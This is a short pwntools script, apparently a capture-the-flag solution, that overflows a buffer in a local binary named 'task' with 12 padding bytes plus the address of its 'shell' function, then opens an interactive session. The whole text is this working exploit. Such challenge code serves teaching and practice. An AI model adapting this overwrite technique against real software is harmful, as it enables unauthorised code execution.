from pwn import *

elf = ELF("./task")

payload = b"A" * 12
payload += p64(elf.symbols["shell"])

p = process("./task")
p.sendline(payload)
p.interactive()

